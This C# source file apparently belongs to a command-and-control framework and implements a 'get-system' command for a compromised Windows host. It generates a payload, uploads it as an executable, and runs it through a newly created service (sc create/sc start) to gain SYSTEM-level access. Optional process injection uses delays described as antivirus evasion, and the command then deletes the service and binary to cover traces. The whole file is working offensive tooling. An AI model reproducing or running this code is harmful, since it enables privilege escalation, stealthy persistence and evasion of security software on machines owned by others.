using System;
using System.Collections.Generic;
using System.CommandLine;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Commander.Commands.Agent;
using Commander.Commands.Scripted;
using Commander.Executor;
using Common;
using Common.Payload;
using Shared;
using Spectre.Console;

namespace Commander.Commands.Composite
{
    public class GetSystemCommandOptions
    {
        public string endpoint { get; set; }
        public bool verbose { get; set; }
        public string pipe { get; set; }
        public string file { get; set; }
        public string path { get; set; }
        public string service { get; set; }
        public bool inject { get; set; }

        public int injectDelay { get; set; }

        public string injectProcess { get; set; }

        public bool x86 { get; set; }


    }
    public class GetSystemCommand : ScriptCommand<GetSystemCommandOptions>
    {
        public override string Description => "Obtain system agent using Services";
        public override string Name => "get-system";
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
        {
             new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
             new Option<string>(new[] { "--endpoint", "-b" }, () => null, "EndPoint to Bind To"),
             new Option<string>(new[] { "--pipe", "-n" }, () => "localsys","Name of the pipe used to pivot."),
             new Option<string>(new[] { "--file", "-f" }, () => null,"Name of payload."),
             new Option<string>(new[] { "--service", "-s" }, () => "syssvc","Name of service."),
             new Option<string>(new[] { "--path", "-p" }, () => "c:\\windows","Name of the folder to upload the payload."),
             new Option(new[] { "--inject", "-i" }, "Îf the payload should be an injector"),
             new Option<int>(new[] { "--injectDelay", "-id" },() => 30, "Delay before injection (AV evasion)"),
             new Option<string>(new[] { "--injectProcess", "-ip" },() => null, "Process path used for injection"),
             new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
        };

        protected override void Run(ScriptingAgent<GetSystemCommandOptions> agent, ScriptingCommander<GetSystemCommandOptions> commander, ScriptingTeamServer<GetSystemCommandOptions> teamServer, GetSystemCommandOptions options, CommanderConfig config)
        {
            if (agent.Metadata.Integrity != Shared.IntegrityLevel.High)
            {
                commander.WriteError($"[X] Agent should be in High integrity context!");
                return;
            }

            if (string.IsNullOrEmpty(options.endpoint))
            {
                options.endpoint = $"pipe://127.0.0.1:{options.pipe}";
                commander.WriteLine($"No Endpoint selected, taking the current agent enpoint ({options.endpoint})");
            }

            var endpoint = ConnexionUrl.FromString(options.endpoint);
            if (!endpoint.IsValid)
            {
                commander.WriteError($"[X] EndPoint is not valid !");
                return;
            }

            var payloadOptions = new PayloadGenerationOptions()
            {
                Architecture =  agent.Metadata.Architecture == "x86" ? PayloadArchitecture.x86 : PayloadArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = false,
                IsVerbose = options.verbose,
                ServerKey = config.ServerConfig.Key,
                Type = PayloadType.Service,
                InjectionDelay = options.injectDelay,
                IsInjected = options.inject,
                InjectionProcess = options.injectProcess
            };

            if (!string.IsNullOrEmpty(options.injectProcess))
                payloadOptions.InjectionProcess = options.injectProcess;

            commander.WriteInfo($"[>] Generating Payload!");
            var pay = commander.GeneratePayload(payloadOptions, options.verbose);
            if (pay == null)
                commander.WriteError($"[X] Generation Failed!");
            else
                commander.WriteSuccess($"[+] Generation succeed!");

            commander.WriteLine($"Preparing to upload the file...");

            var fileName = string.IsNullOrEmpty(options.file) ? ShortGuid.NewGuid() + ".exe" : options.file;
            if (Path.GetExtension(fileName).ToLower() != ".exe")
                fileName += ".exe";

            string path = options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;

            agent.Echo($"Downloading file {fileName} to {path}");
            agent.Upload(pay, path);
            agent.Delay(1);
            agent.Echo($"Creating service");
            agent.Shell($"sc create {options.service} binPath= \"{path}\"");
            agent.Echo($"Starting service");
            agent.Shell($"sc start {options.service}");

            if (!options.inject)
            {
                agent.Echo($"Removing service");
                agent.Shell($"sc delete {options.service}");
                agent.Echo($"[!] Don't forget to remove service binary after use! : del {path}");
            }
            else
            {
                agent.Echo($"Waiting {options.injectDelay + 10}s to evade antivirus");
                agent.Delay(options.injectDelay + 10);
                agent.Echo($"Removing service");
                agent.Shell($"sc delete {options.service}");
                agent.Echo($"Removing injector {path}");
                agent.DeleteFile(path);
            }

            agent.Echo($"[*] Execution done!");
            agent.Echo(Environment.NewLine);

            if (endpoint.Protocol == ConnexionType.NamedPipe)
            {
                agent.Echo($"Linking to {endpoint}");
                var targetEndPoint = ConnexionUrl.FromString($"rpipe://127.0.0.1:{options.pipe}");
                agent.Link(targetEndPoint);
            }

            if (options.inject)
                commander.WriteInfo($"Due to AV evasion, agent can take a couple of minutes to check-in...");
        }
    }
}
